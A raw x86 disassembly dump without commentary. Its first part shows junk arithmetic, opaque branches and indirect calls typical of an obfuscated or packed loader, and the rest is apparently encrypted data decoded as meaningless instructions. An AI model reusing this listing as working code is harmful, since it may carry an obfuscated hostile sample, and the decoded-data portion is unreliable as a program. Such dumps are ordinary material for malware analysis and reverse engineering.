  41971e:	mov    DWORD PTR ds:0x42822b,0x3b2
  419728:	jmp    0x419775
  41972d:	mov    DWORD PTR ds:0x428343,0x5836
  419737:	cmp    DWORD PTR ds:0x428333,0x0
  41973e:	jbe    0x419767
  419744:	push   DWORD PTR [ebp-0x24]
  419747:	call   DWORD PTR ds:0x428dc4
  41974d:	movzx  edx,BYTE PTR ds:0x42812b
  419754:	adc    DWORD PTR ds:0x4282b3,edx
  41975a:	movzx  edx,BYTE PTR ds:0x428267
  419761:	add    DWORD PTR ds:0x42814b,edx
  419767:	and    edx,edx
  419769:	sub    ebx,edx
  41976b:	or     DWORD PTR ds:0x42825f,0x6a01
  419775:	xor    eax,0xa4069aae
  41977a:	cmp    DWORD PTR ds:0x42814b,0x0
  419781:	mov    DWORD PTR ds:0x428213,ebx
  419787:	mov    ebx,0x3314
  41978c:	jmp    0x4197fe
  419791:	mov    DWORD PTR ds:0x42822b,ebx
  419797:	cmp    DWORD PTR ds:0x42814b,0x0
  41979e:	jb     0x4197dd
  4197a4:	push   0x7db2
  4197a9:	push   0x7dda
  4197ae:	push   0x6d09
  4197b3:	push   DWORD PTR [ebp-0x20]
  4197b6:	push   DWORD PTR [ebp-0x28]
  4197b9:	call   DWORD PTR ds:0x428dc8
  4197bf:	sub    DWORD PTR ds:0x428243,0x63b8
  4197c9:	add    DWORD PTR ds:0x4282bf,0x4281ff
  4197d3:	add    DWORD PTR ds:0x42821f,0x428147
  4197dd:	mov    ebx,DWORD PTR ds:0x428167
  4197e3:	xor    edx,edx
  4197e5:	add    edx,DWORD PTR ds:0x428277
  4197eb:	sub    ebx,edx
  4197ed:	sub    ebx,DWORD PTR [ebx+edx*1]
  4197f0:	sbb    ebx,ebx
  4197f2:	add    DWORD PTR ds:0x4281f7,ecx
  4197f8:	and    DWORD PTR ds:0x42824f,ecx
  4197fe:	mov    DWORD PTR [ecx],eax
  419800:	lea    eax,[esp+0x40]
  419804:	neg    edx
  419806:	mov    DWORD PTR [esp+0x98],eax
  41980d:	add    ecx,DWORD PTR ds:0x4282cf
  419813:	lea    eax,[esp+0x98]
  41981a:	or     edx,0x537a
  419820:	mov    DWORD PTR [esp+0x9c],eax
  419827:	cmp    DWORD PTR ds:0x42814b,0x0
  41982e:	not    ebx
  419830:	mov    DWORD PTR ds:0x428337,0x7e9e
  41983a:	mov    edx,0x7e32
  41983f:	jmp    0x419909
  419844:	mov    DWORD PTR ds:0x4282d7,0x6cf
  41984e:	mov    DWORD PTR ds:0x428363,0x6551
  419858:	cmp    DWORD PTR ds:0x42814b,0x0
  41985f:	jge    0x41988b
  419865:	push   0x4cee
  41986a:	push   0x2107
  41986f:	push   0x820f
  419874:	push   DWORD PTR [ebp-0x10]
  419877:	call   DWORD PTR ds:0x428e5c
  41987d:	adc    edx,edx
  41987f:	add    ecx,0x4be2
  419885:	and    ecx,0x5fef
  41988b:	mov    ebx,DWORD PTR ds:0x42836b
  419891:	mov    ecx,DWORD PTR ds:0x42836f
  419897:	sub    ebx,ecx
  419899:	or     ebx,DWORD PTR [ebx+ecx*1]
  41989c:	xor    ecx,DWORD PTR ds:0x42825b
  4198a2:	cmp    DWORD PTR ds:0x42811f,0x0
  4198a9:	mov    DWORD PTR ds:0x428113,0x2b9c
  4198b3:	movzx  ecx,WORD PTR ds:0x4282df
  4198ba:	not    DWORD PTR ds:0x4282d3
  4198c0:	jmp    0x419909
  4198c5:	mov    edx,0x5053
  4198ca:	cmp    DWORD PTR ds:0x42811f,0x0
  4198d1:	jne    0x4198eb
  4198d7:	call   DWORD PTR ds:0x428dcc
  4198dd:	sbb    ecx,ecx
  4198df:	not    DWORD PTR ds:0x428243
  4198e5:	and    DWORD PTR ds:0x4282db,edi
  4198eb:	mov    edx,DWORD PTR ds:0x4282af
  4198f1:	sbb    DWORD PTR ds:0x428137,edx
  4198f7:	or     DWORD PTR ds:0x4282c7,0x212d
  419901:	adc    edx,edx
  419903:	and    DWORD PTR ds:0x428233,edi
  419909:	mov    eax,DWORD PTR [esp+0x40]
  41990d:	sub    DWORD PTR [esp+0x40],eax
  419911:	mov    edx,DWORD PTR ds:0x4281df
  419917:	xor    ecx,ecx
  419919:	xor    ecx,DWORD PTR ds:0x4281e3
  41991f:	sub    edx,ecx
  419921:	or     edx,DWORD PTR [edx+ecx*1]
  419924:	lea    eax,[ebp+0x4]
  419927:	cmp    DWORD PTR ds:0x4282d7,0x0
  41992e:	mov    edx,0x60f5
  419933:	not    edx
  419935:	not    edx
  419937:	jmp    0x419a27
  41993c:	mov    DWORD PTR ds:0x4281eb,0x4551
  419946:	mov    DWORD PTR ds:0x42824f,0x487
  419950:	cmp    DWORD PTR ds:0x4282d7,0x0
  419957:	jne    0x419988
  41995d:	push   0x803a
  419962:	push   DWORD PTR [ebp-0x18]
  419965:	push   DWORD PTR [ebp-0x1c]
  419968:	push   0x318a
  41996d:	push   DWORD PTR [ebp-0x20]
  419970:	call   DWORD PTR ds:0x428dd0
  419976:	sbb    edx,ebx
  419978:	add    ecx,0x5f27
  41997e:	sbb    DWORD PTR ds:0x4282af,0x75a
  419988:	sub    DWORD PTR ds:0x428257,0x2f43
  419992:	movzx  ecx,BYTE PTR ds:0x4281fb
  419999:	sub    ecx,DWORD PTR ds:0x42835f
  41999f:	mov    DWORD PTR ds:0x4281fb,ecx
  4199a5:	cmp    DWORD PTR ds:0x42821b,0x0
  4199ac:	mov    DWORD PTR ds:0x4282b3,0x47a6
  4199b6:	mov    edx,0x1bf3
  4199bb:	mov    DWORD PTR ds:0x42811b,0x10c7
  4199c5:	mov    DWORD PTR ds:0x428337,0x1d16
  4199cf:	jmp    0x419a27
  4199d4:	mov    DWORD PTR ds:0x42821b,edi
  4199da:	cmp    DWORD PTR ds:0x42821b,0x0
  4199e1:	jge    0x419a0f
  4199e7:	push   0x4281f3
  4199ec:	push   0x427f1b
  4199f1:	call   DWORD PTR ds:0x428e60
  4199f7:	sub    DWORD PTR ds:0x428367,ecx
  4199fd:	mov    ecx,DWORD PTR ds:0x4282df
  419a03:	sbb    DWORD PTR ds:0x428267,ecx
  419a09:	adc    edx,DWORD PTR ds:0x42834b
  419a0f:	and    edx,0x987
  419a15:	adc    DWORD PTR ds:0x4282c7,0x29fb
  419a1f:	sbb    ecx,edx
  419a21:	xor    DWORD PTR ds:0x4282bf,edi
  419a27:	xor    DWORD PTR [esp+0x40],eax
  419a2b:	mov    ebx,DWORD PTR ds:0x4282d7
  419a31:	xor    DWORD PTR ds:0x4281eb,ebx
  419a37:	mov    DWORD PTR [esp+0x30],0x5b3d
  419a3f:	add    edx,0x5f01
  419a45:	mov    DWORD PTR [esp+0x34],0x4445
  419a4d:	sub    eax,DWORD PTR ds:0x4281ef
  419a53:	mov    DWORD PTR [esp+0x10],0xa52
  419a5b:	mov    DWORD PTR [esp+0x14],0x1c69
  419a63:	mov    eax,DWORD PTR [esp+0x10]
  419a67:	jmp    0x419e36
  419a6c:	xchg   DWORD PTR [edi-0x63e03bea],ebp
  419a72:	inc    edx
  419a73:	sub    bh,BYTE PTR [edx-0x5a8f7006]
  419a79:	scas   eax,DWORD PTR es:[edi]
  419a7a:	mov    ch,0x7c
  419a7c:	jecxz  0x419a39
  419a7e:	push   ss
  419a7f:	sbb    BYTE PTR [edx+edx*1-0x7a70e7e8],bh
  419a86:	jl     0x419a68
  419a88:	imul   esp,esi,0x48
  419a8b:	sti    
  419a8c:	add    al,BYTE PTR [esi-0x69a83107]
  419a92:	fistp  DWORD PTR [ebx-0x6]
  419a95:	sti    
  419a96:	add    eax,0x5ca3ac86
  419a9b:	add    edi,ebx
  419a9d:	push   edx
  419a9e:	mov    ds:0x25f68370,eax
  419aa3:	xchg   BYTE PTR [edi+0x75d1e74a],cl
  419aa9:	mov    ds:0x93ecd9f0,al
  419aae:	pop    esp
  419aaf:	or     bh,BYTE PTR [edi-0x3f04fc21]
  419ab5:	cli    
  419ab6:	dec    esp
  419ab7:	out    dx,eax
  419ab8:	pusha  
  419ab9:	(bad)  
  419aba:	xor    esp,ebx
  419abc:	pusha  
  419abd:	and    DWORD PTR [ebx],0x275c881
  419ac3:	jns    0x419b0e
  419ac5:	outs   dx,BYTE PTR ds:[esi]
  419ac6:	push   eax
  419ac7:	nop
  419ac8:	inc    ebx
  419ac9:	pop    ss
  419aca:	mov    eax,ds:0x65666122
  419acf:	jmp    0x3df0e758
  419ad4:	mov    ch,0xc7
  419ad6:	inc    edx
  419ad7:	jno    0x419aee
  419ad9:	les    esi,FWORD PTR [esi-0x3c107c2]
  419adf:	adc    dl,ah
  419ae1:	inc    esp
  419ae2:	add    eax,0x2584d812
  419ae7:	inc    esp
  419ae8:	ret    
  419ae9:	test   al,0x8c
  419aeb:	sbb    dh,BYTE PTR [edx+0x3a]
  419aee:	mov    ecx,0x3223904c
  419af3:	pusha  
  419af4:	jecxz  0x419af1
  419af6:	mov    ch,0xe8
  419af8:	cmp    DWORD PTR [edx],ebp
  419afa:	and    BYTE PTR [ecx-0x40bbef8d],cl
  419b00:	cmp    DWORD PTR cs:[ebp+0x0],ebp
  419b04:	test   al,0x44
  419b06:	inc    ebx
  419b07:	std    
  419b08:	test   DWORD PTR [ebp+0x2e],esp
  419b0b:	inc    esp
  419b0c:	mov    ch,0x2c
  419b0e:	mov    esp,DWORD PTR [edx+eax*1-0x3c]
  419b12:	shl    DWORD PTR ss:0x1b80cc0c,1
  419b19:	pusha  
  419b1a:	bound  esp,QWORD PTR [ebx-0x52]
  419b1d:	cdq    
  419b1e:	cmc    
  419b1f:	stos   BYTE PTR es:[edi],al
  419b20:	rol    DWORD PTR [edx-0x9791b5b],1
  419b26:	jmp    0x4b48:0x758e1c81
  419b2d:	daa    
  419b2e:	loopne 0x419b94
  419b30:	shl    DWORD PTR [ebp-0x79],0xea
  419b34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b35:	cmc    
  419b36:	inc    ebx
  419b37:	pusha  
  419b38:	or     esi,edi
  419b3a:	retf   0x383c
  419b3d:	daa    
  419b3e:	fstp   TBYTE PTR [ebp-0x3]
  419b41:	xchg   ecx,eax
  419b42:	pop    esp
  419b43:	xchg   DWORD PTR ds:0x639ab9c0,eax
  419b49:	popa   
  419b4a:	nop
  419b4b:	cdq    
  419b4c:	dec    esp
  419b4d:	push   ds
  419b4e:	jns    0x419b20
  419b50:	out    0x1d,al
  419b52:	jge    0x419b29
  419b54:	pop    ebp
  419b55:	ins    BYTE PTR es:[edi],dx
  419b56:	mov    edi,0xbe7e2c38
  419b5b:	out    0xbe,eax
  419b5d:	jmp    0x419b9e
  419b5f:	sub    DWORD PTR [edi+0xcdcb6b9],eax
  419b65:	les    ebx,FWORD PTR cs:[esi+0x1a]
  419b69:	push   edx
  419b6a:	xor    BYTE PTR [ebp-0x2e258db9],cl
  419b70:	sar    DWORD PTR [ebx],0xdb
  419b73:	add    ecx,esi
  419b75:	push   ss
  419b76:	add    al,0xd8
  419b78:	enter  0x7b31,0x22
  419b7c:	outs   dx,BYTE PTR ds:[esi]
  419b7d:	in     eax,dx
  419b7e:	push   ss
  419b7f:	jno    0x419b0a
  419b81:	inc    ebx
  419b82:	cmp    al,0xdb
  419b84:	dec    edx
  419b85:	dec    ebx
  419b86:	sub    dl,dh
  419b88:	mov    bh,0x55
  419b8a:	test   eax,0xfc7103a6
  419b8f:	out    0x77,eax
  419b91:	mov    ebx,0x7c4aa1b6
  419b96:	daa    
  419b97:	mov    ebp,0x13c38e5f
  419b9c:	ja     0x419b92
  419b9e:	xchg   ebx,eax
  419b9f:	data16 stos BYTE PTR es:[edi],al
  419ba1:	enter  0xbe68,0x2c
  419ba5:	dec    ecx
  419ba6:	mov    ecx,0x5ba3952c
  419bab:	sahf   
  419bac:	xchg   edx,eax
  419bad:	jl     0x419ba4
  419baf:	loope  0x419b67
  419bb1:	adc    eax,0x9f4ba35b
  419bb6:	mov    dl,0x2c
  419bb8:	xchg   ecx,eax
  419bb9:	xchg   esp,eax
  419bba:	fcom   st(6)
  419bbc:	mov    gs,WORD PTR [edi+0x37]
  419bbf:	fwait
  419bc0:	(bad)  
  419bc2:	dec    eax
  419bc3:	push   esp
  419bc4:	(bad)  
  419bc6:	lea    eax,[esi]
  419bc8:	lods   eax,DWORD PTR ds:[esi]
  419bc9:	mov    esp,0xd443500e
  419bce:	cmp    BYTE PTR ds:0xa66921d1,bh
  419bd4:	into   
  419bd5:	mov    bh,0xe0
  419bd7:	(bad)  
  419bd8:	xchg   ecx,eax
  419bd9:	sar    ch,cl
  419bdb:	stos   DWORD PTR es:[edi],eax
  419bdc:	je     0x419c4d
  419bde:	out    dx,eax
  419bdf:	(bad)  
  419be1:	push   cs
  419be2:	enter  0x78af,0xf8
  419be6:	iret   
  419be7:	push   esi
  419be8:	stos   DWORD PTR es:[edi],eax
  419be9:	mov    al,ds:0xa5d7070b
  419bee:	addr16 imul edx,ecx,0xa071da42
  419bf5:	dec    esp
  419bf6:	pushf  
  419bf7:	dec    ecx
  419bf8:	xor    ecx,DWORD PTR [edi]
  419bfa:	ins    BYTE PTR es:[edi],dx
  419bfb:	adc    eax,DWORD PTR [ecx-0x22]
  419bfe:	push   0xffffffc5
  419c00:	xor    DWORD PTR [ebp+0x1216ac65],ecx
  419c06:	fidiv  DWORD PTR [edi+0x17]
  419c09:	add    bh,ch
  419c0b:	out    dx,al
  419c0c:	pop    ebp
  419c0d:	jl     0x419c88
  419c0f:	imul   BYTE PTR [ecx-0x65b07231]
  419c15:	xor    edx,DWORD PTR [eax+ebx*4+0x70]
  419c19:	jnp    0x419c79
  419c1b:	adc    ch,BYTE PTR [esi-0x80]
  419c1e:	rep stos BYTE PTR es:[edi],al
  419c20:	sub    al,0x23
  419c22:	xchg   esp,eax
  419c23:	add    DWORD PTR [esi],ebp
  419c25:	push   es
  419c26:	xor    BYTE PTR [ebx-0x18f85311],0xa3
  419c2d:	sub    dh,ch
  419c2f:	inc    edx
  419c30:	cmp    BYTE PTR [ebx],ch
  419c32:	mov    ds:0xa7b78f97,eax
  419c37:	sbb    edi,0xd9f36c1c
  419c3d:	adc    DWORD PTR [ecx-0x3b],esp
  419c40:	mov    ds,WORD PTR [eax]
  419c42:	in     al,0xd2
  419c44:	pop    edi
  419c45:	cld    
  419c46:	push   ecx
  419c47:	dec    ecx
  419c48:	and    eax,0x31d58f62
  419c4d:	bswap  edx
  419c4f:	and    DWORD PTR [ebx-0x7b63d32e],esp
  419c55:	frstor [edi+edx*8]
  419c58:	inc    ebp
  419c59:	mov    ah,BYTE PTR [ecx+0x38]
  419c5c:	sbb    DWORD PTR [ecx],ebp
  419c5e:	ret    0x9267
  419c61:	test   BYTE PTR [ebx+0x304f2257],0xaa
  419c68:	pusha  
  419c69:	inc    esp
  419c6a:	add    DWORD PTR [ebp+0x4],esp
  419c6d:	mov    bh,bh
  419c6f:	jo     0x419c3b
  419c71:	jle    0x419c3a
  419c73:	adc    edi,DWORD PTR [ecx+0x7a]
  419c76:	fwait
  419c77:	xor    al,0x65
  419c79:	in     al,dx
  419c7a:	mov    cl,0x8c
  419c7c:	stc    
  419c7d:	and    al,0x5
  419c7f:	test   BYTE PTR [edi+0x28],cl
  419c82:	jnp    0x419c36
  419c84:	cmp    al,0x40
  419c86:	(bad)  
  419c87:	aam    0x56
  419c89:	push   edx
  419c8a:	cmp    BYTE PTR [edx],bh
  419c8c:	mov    al,ds:0xaaf5a5fc
  419c91:	or     eax,0xfcea17b3
  419c96:	test   ah,cl
  419c98:	push   ds
  419c99:	daa    
  419c9a:	xchg   edx,eax
  419c9b:	mov    edx,0xd565075c
  419ca0:	jp     0x419c6c
  419ca2:	push   ebx
  419ca3:	aam    0xa0
  419ca5:	fidiv  DWORD PTR [ebp+0x41]
  419ca8:	sbb    DWORD PTR [ecx],0xecd7caf7
  419cae:	dec    ebx
  419caf:	mov    ?,WORD PTR [ebp+0x5]
  419cb2:	popf   
  419cb3:	mov    al,ds:0xbd87c95f
  419cb8:	inc    edi
  419cb9:	inc    ebx
  419cba:	push   cs
  419cbb:	and    al,BYTE PTR [ecx+eax*2+0x218c349]
  419cc2:	sbb    dl,BYTE PTR [edi+0x5]
  419cc5:	ja     0x419c9e
  419cc7:	push   ds
  419cc8:	jae    0x419c94
  419cca:	outs   dx,DWORD PTR ds:[esi]
  419ccb:	pop    edi
  419ccc:	ret    
  419ccd:	fstp   TBYTE PTR [ebp-0x4f644f56]
  419cd3:	jl     0x419ca7
  419cd5:	push   0xd5bf6e78
  419cda:	mov    ebp,0x8642742d
  419cdf:	adc    al,0x1a
  419ce1:	(bad)  
  419ce2:	in     al,dx
  419ce3:	sar    DWORD PTR [edx],0x41
  419ce6:	inc    esp
  419ce7:	or     eax,0xbb5e0b92
  419cec:	(bad)  
  419ced:	arpl   WORD PTR [esi+ebp*4+0x3539ecfb],dx
  419cf4:	nop
  419cf5:	ins    BYTE PTR es:[edi],dx
  419cf6:	sar    BYTE PTR [edi],0x1b
  419cf9:	jo     0x419ceb
  419cfb:	mov    ecx,ecx
  419cfd:	push   edx
  419cfe:	fsubr  QWORD PTR [ebx]
  419d00:	cs jge 0x419d1e
  419d03:	or     esp,DWORD PTR [ebp-0x6bc35e71]
  419d09:	mov    ah,0x7c
  419d0b:	mov    ?,WORD PTR [edi-0x6413ef92]
  419d11:	inc    edi
  419d12:	mov    edi,0xeabc5298
  419d17:	xchg   ebx,eax
  419d18:	div    DWORD PTR [edi]
  419d1a:	jmp    0x419d0c
  419d1c:	push   esp
  419d1d:	pop    ebp
  419d1e:	in     eax,dx
  419d1f:	cmp    bl,ch
  419d21:	sbb    al,0xdc
  419d23:	pop    eax
  419d24:	ror    DWORD PTR [ebp+ebp*8+0x3021bab9],cl
  419d2b:	mov    bh,0xee
  419d2d:	xchg   edx,eax
  419d2e:	pop    ss
  419d2f:	mov    cl,0x4b
  419d31:	xor    ch,BYTE PTR [ecx-0x65d64bc6]
  419d37:	jmp    0x5aa:0x5c62fd7c
  419d3e:	mov    esi,0x2b325d4f
  419d43:	push   ebx
  419d44:	jbe    0x419ccd
  419d46:	outs   dx,DWORD PTR ds:[esi]
  419d47:	and    al,0x30
  419d49:	pop    ebx
  419d4a:	add    BYTE PTR [edx+ecx*8+0x12],bl
  419d4e:	jbe    0x419d9e
  419d50:	mov    cl,0xec
  419d52:	inc    esp
  419d53:	aaa    
  419d54:	outs   dx,BYTE PTR ds:[esi]
  419d55:	add    DWORD PTR [esi-0x11],ecx
  419d58:	jno    0x419d46
  419d5a:	sub    ch,BYTE PTR [edi]
  419d5c:	add    edi,ebp
  419d5e:	sbb    BYTE PTR [ebx-0x585a400f],bl
  419d64:	and    eax,0xc05e72ac
  419d69:	iret   
  419d6a:	jecxz  0x419cf8
  419d6c:	push   ecx
  419d6d:	or     eax,0x2ca0c496
  419d72:	add    al,BYTE PTR [esi-0x1e5c6988]
  419d78:	dec    edi
  419d79:	scas   al,BYTE PTR es:[edi]
  419d7a:	mov    eax,DWORD PTR [ecx-0x32]
  419d7d:	push   0xfffffffd
  419d7f:	xor    eax,0xae1c270c
  419d84:	cmp    eax,0x478707
  419d89:	dec    edi
  419d8a:	jg     0x419d9a
  419d8c:	mov    eax,0xb1a27fca
  419d91:	rol    DWORD PTR [ebp-0x70],cl
  419d94:	sub    edi,eax
  419d96:	inc    ebx
  419d97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d98:	xor    eax,DWORD PTR [edi]
  419d9a:	imul   ebx,esp,0xffffff94
  419d9d:	(bad)  
  419d9e:	xor    eax,0xcfd829e7
  419da3:	inc    esi
  419da4:	mov    WORD PTR [ebp-0x4a8997e1],?
  419daa:	sub    eax,0xe0975bf3
  419daf:	int    0xe9
  419db1:	imul   edi,edi,0x68
  419db4:	lods   eax,DWORD PTR ds:[esi]
  419db5:	call   DWORD PTR [esp+eax*1]
  419db8:	stos   DWORD PTR es:[edi],eax
  419db9:	jo     0x419dea
  419dbb:	mul    BYTE PTR [ecx]
  419dbd:	sub    bl,dh
  419dbf:	pop    ss
  419dc0:	add    BYTE PTR [ebx-0x14b11226],0x5b
  419dc7:	addr16 pop edx
  419dc9:	mov    cl,0xc5
  419dcb:	loopne 0x419d86
  419dcd:	mov    DWORD PTR [esi+esi*4+0x55ce6608],ebx
  419dd4:	adc    DWORD PTR [edi+0x2],edx
  419dd7:	sbb    BYTE PTR [ecx+0x43a7ee49],0x5f
  419dde:	gs xchg ebp,eax
  419de0:	popf   
  419de1:	outs   dx,BYTE PTR ds:[esi]
  419de2:	std    
  419de3:	jmp    0x54a9:0x6da0b903
  419dea:	push   ebp
  419deb:	sbb    ebx,eax
  419ded:	adc    DWORD PTR [ebx+0x62d942e6],eax
  419df3:	mov    bl,0xcb
  419df5:	push   esp
  419df6:	inc    ecx
  419df7:	and    DWORD PTR [edi-0x6f],esp
  419dfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419dfb:	sub    al,BYTE PTR [edi-0x44]
  419dfe:	add    DWORD PTR [eax],edi
  419e00:	sub    al,BYTE PTR [ebp-0x575908ad]
  419e06:	push   0x2481a5ca
  419e0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e0c:	sbb    ecx,DWORD PTR [ebp-0x73]
  419e0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e10:	jecxz  0x419e20
  419e12:	int    0xb8
  419e14:	and    al,0x6c
  419e16:	nop
  419e17:	jo     0x419db0
  419e19:	icebp  
  419e1a:	cmp    eax,DWORD PTR [edx]
  419e1c:	(bad)  
  419e1d:	cmp    BYTE PTR [edx+0x62],dl
  419e20:	mov    ah,0x1
  419e22:	sti    
  419e23:	stos   DWORD PTR es:[edi],eax
  419e24:	push   ds
  419e25:	pop    es
  419e26:	pushf  
  419e27:	pop    ss
  419e28:	jnp    0x419dfe
  419e2a:	pusha  
  419e2b:	jecxz  0x419e47
  419e2d:	das    
  419e2e:	jmp    0x6727:0xb973b052
  419e35:	cmp    al,0x8b
  419e37:	dec    esp
  419e38:	and    al,0x14
  419e3a:	mov    edx,DWORD PTR [esp+0x30]
  419e3e:	mov    ebx,DWORD PTR [esp+0x34]
  419e42:	add    eax,0xffffd1a5
  419e47:	adc    ecx,0xffffedf0
  419e4d:	xor    eax,edx
  419e4f:	xor    ecx,ebx
  419e51:	jmp    0x41a220
  419e56:	pop    eax
  419e58:	es push esp
  419e5a:	sub    bl,BYTE PTR es:[ebx-0x46]
  419e5e:	pusha  
  419e5f:	in     eax,0xd3
  419e61:	mov    esp,0x6af8e913
  419e66:	xchg   BYTE PTR [ebp+0x12bc1816],dh
  419e6c:	sbb    BYTE PTR [eax],bl
  419e6e:	(bad)  
  419e6f:	and    BYTE PTR [ebp+0x342d7a28],cl
  419e75:	xchg   edx,eax
  419e76:	ficomp DWORD PTR [ebx]
  419e78:	pop    ecx
  419e79:	dec    esp
  419e7a:	into   
  419e7b:	xchg   ecx,eax
  419e7c:	or     BYTE PTR [esi],al
  419e7e:	sbb    esp,0x2a87533a
  419e84:	push   0xffffffdb
  419e86:	mov    ebx,0x2b01b28e
  419e8b:	mov    ah,0x64
  419e8d:	out    dx,al
  419e8e:	add    ecx,esp
  419e90:	sbb    dl,BYTE PTR [edi+0x12594d94]
  419e96:	pop    esp
  419e97:	inc    esi
  419e98:	jge    0x419e95
  419e9a:	cmp    DWORD PTR [ebx+0x26],ebp
  419e9d:	inc    ebx
  419e9e:	scas   al,BYTE PTR es:[edi]
  419e9f:	pop    ebx
  419ea0:	loopne 0x419f1a
  419ea2:	sbb    eax,0xffffffb1
  419ea5:	es scas eax,DWORD PTR es:[edi]
  419ea7:	aam    0xaf
  419ea9:	nop
  419eaa:	sub    al,0xd2
  419eac:	(bad)  
  419ead:	leave  
  419eae:	cmc    
  419eaf:	repz leave 
  419eb1:	outs   dx,BYTE PTR ds:[esi]
  419eb2:	xchg   bl,dl
  419eb4:	(bad)  
  419eb5:	sub    eax,0x77d1864b
  419eba:	jno    0x419ef8
  419ebc:	aam    0x3
  419ebe:	adc    BYTE PTR [eax-0x28],dh
  419ec1:	(bad)  
  419ec3:	outs   dx,DWORD PTR ds:[esi]
  419ec4:	scas   eax,DWORD PTR es:[edi]
  419ec5:	or     BYTE PTR [eax+0x3],0x17
  419ec9:	stos   BYTE PTR es:[edi],al
  419eca:	sbb    BYTE PTR [ebp+0x30678144],al
  419ed0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ed1:	loop   0x419e56
  419ed3:	jl     0x419f32
  419ed5:	fld    DWORD PTR [edi-0x5814ff17]
  419edb:	pushf  
  419edc:	dec    edx
  419edd:	fst    st(7)
  419edf:	in     al,0x92
  419ee1:	out    dx,eax
  419ee2:	dec    ebx
  419ee3:	mov    al,0x68
  419ee5:	adc    DWORD PTR [eax+0x4026bd3e],ecx
  419eeb:	mov    dl,0xf7
  419eed:	cmp    BYTE PTR [edx-0x80],0x2a
  419ef1:	sub    eax,0x3b69ff53
  419ef6:	int    0x66
  419ef8:	enter  0xef1f,0xf3
  419efc:	push   eax
  419efd:	xchg   edi,eax
  419efe:	xor    eax,0xf1af8b62
  419f03:	daa    
  419f04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f05:	or     DWORD PTR [ebx+0x6e98b931],ebx
  419f0b:	xchg   ebp,eax
  419f0c:	sti    
  419f0d:	mov    ds:0x59373c7f,ax
  419f13:	out    dx,al
  419f14:	xlat   BYTE PTR ds:[ebx]
  419f15:	jl     0x419f8f
  419f17:	cmp    BYTE PTR [esi-0x70],dh
  419f1a:	shl    DWORD PTR [edi+0x72980c90],0xf8
  419f21:	out    dx,al
  419f22:	adc    eax,0xd176f9a5
  419f27:	jg     0x419eb1
  419f29:	(bad)  
  419f2a:	xor    esi,eax
  419f2c:	in     eax,0x6d
  419f2e:	and    DWORD PTR [ecx+0x3d],ebx
  419f31:	call   0xad4d:0x4483e047
  419f38:	fidivr DWORD PTR ds:0x59a3553f
  419f3e:	and    dl,BYTE PTR [ecx-0x4d]
  419f41:	pop    ebp
  419f42:	adc    ecx,DWORD PTR [edx]
  419f44:	in     al,dx
  419f45:	dec    ebx
  419f46:	retf   
  419f47:	shr    edx,1
  419f49:	mov    edx,0x6ec0296b
  419f4e:	imul   edx,esi,0x45
  419f51:	(bad)  
  419f53:	sbb    ebx,DWORD PTR [eax]
  419f55:	mov    ebx,0x7c0cd11f
  419f5a:	mov    bh,BYTE PTR [ecx]
  419f5c:	ficom  DWORD PTR [ebx-0x37]
  419f5f:	out    0x3a,eax
  419f61:	jb     0x419f7a
  419f63:	jne    0x419fba
  419f65:	repz jne 0x419f13
  419f68:	mov    ds:0x210525a6,eax
  419f6d:	add    ebx,ebx
  419f6f:	fstp   DWORD PTR ds:0x20c7cb44
  419f75:	outs   dx,BYTE PTR ds:[esi]
  419f77:	add    BYTE PTR [eax-0x5a3db1ed],0xfc
  419f7e:	xor    eax,esi
  419f80:	clc    
  419f81:	or     eax,0x3c783527
  419f86:	outs   dx,DWORD PTR ds:[esi]
  419f87:	sbb    DWORD PTR [edi+0x61],edi
  419f8a:	jno    0x419fdf
  419f8c:	jp     0x419f50
  419f8e:	sub    ebx,DWORD PTR [edx+0x7ad7b45a]
  419f94:	jmp    0x3d4e0b58
  419f99:	and    al,0x47
  419f9b:	hlt    
  419f9c:	xchg   edx,eax
  419f9d:	jo     0x419fd6
  419f9f:	or     eax,0xdd83b14d
  419fa4:	or     eax,0xa673af68
  419fa9:	(bad)  
  419fab:	fadd   st(4),st
  419fad:	mov    ss,WORD PTR [esi+esi*2-0x2bb17ac6]
  419fb4:	inc    edx
  419fb5:	imul   edi,DWORD PTR [esi],0x9234b337
  419fbb:	cdq    
  419fbc:	xchg   bh,ch
  419fbe:	inc    edx
  419fbf:	and    al,0x9d
  419fc1:	add    bl,BYTE PTR [eax+edi*1-0x4dc5c6c]
  419fc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fc9:	cdq    
  419fca:	push   0x2493b5eb
  419fcf:	inc    esp
  419fd0:	fsub   QWORD PTR [ebp+0xd]
  419fd3:	inc    esp
  419fd4:	jmp    0x87ca:0xc14f14e
  419fdb:	adc    BYTE PTR [ebx],0xa1
  419fde:	xchg   ebx,eax
  419fdf:	jge    0x419fb4
  419fe1:	mov    edx,0x94c187f9
  419fe6:	(bad)  [ecx+0x282e4090]
  419fec:	push   ds
  419fed:	mov    DWORD PTR [ecx-0x13648819],ebp
  419ff3:	jmp    0xd5a9:0xa67703df
  419ffa:	jmp    0xd678:0x168a83ef
  41a001:	lahf   
  41a002:	dec    ecx
  41a003:	enter  0x985d,0x99
  41a007:	and    al,0x62
  41a009:	xchg   esi,eax
  41a00a:	ret    0x91e6
  41a00d:	jns    0x41a088
  41a00f:	mov    DWORD PTR [esi-0x4d],ebx
  41a012:	push   ecx
  41a013:	inc    DWORD PTR [ebp+0x5b]
  41a016:	and    edi,DWORD PTR [edx]
  41a018:	jo     0x41a02e
  41a01a:	test   BYTE PTR [esi+0x11],bh
  41a01d:	mov    edi,0xb2edb7b
  41a022:	adc    BYTE PTR [ebx+0x28d3964],dh
  41a028:	js     0x41a01e
  41a02a:	addr16 dec edi
  41a02c:	and    DWORD PTR [ebx-0xd],esp
  41a02f:	arpl   WORD PTR [ebp-0x4],cx
  41a032:	mov    al,ds:0xee553f5a
  41a037:	jle    0x419fcb
  41a039:	push   ss
  41a03a:	lods   al,BYTE PTR ds:[esi]
  41a03b:	xchg   dl,bh
  41a03d:	pop    ss
  41a03e:	out    dx,eax
  41a03f:	add    al,0x8c
  41a041:	ss mov ecx,0x9b2a546b
  41a047:	dec    eax
  41a048:	dec    ecx
